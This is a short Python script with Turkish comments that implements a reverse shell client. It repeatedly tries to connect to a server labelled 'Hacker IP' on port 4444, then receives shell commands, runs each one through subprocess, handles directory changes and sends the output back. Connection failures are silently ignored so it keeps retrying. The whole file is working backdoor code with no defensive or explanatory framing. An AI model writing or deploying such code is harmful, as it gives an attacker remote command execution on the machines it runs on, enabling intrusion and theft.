import socket
import subprocess
import os

SERVER_IP = "127.0.0.1" # Hacker IP
PORT = 4444

s = socket.socket()
print("Bağlantı aranıyor...")

while True:
    try:
        s.connect((SERVER_IP, PORT))
        print("Bağlandı!")
        
        while True:
            command = s.recv(1024).decode()
            if command.lower() == "exit": break
            
            if command.startswith("cd "):
                try: os.chdir(command[3:])
                except: pass
                s.send(os.getcwd().encode())
            else:
                output = subprocess.getoutput(command)
                s.send(output.encode())
        s.close()
        break
    except:
        pass # Bağlantı yoksa bekle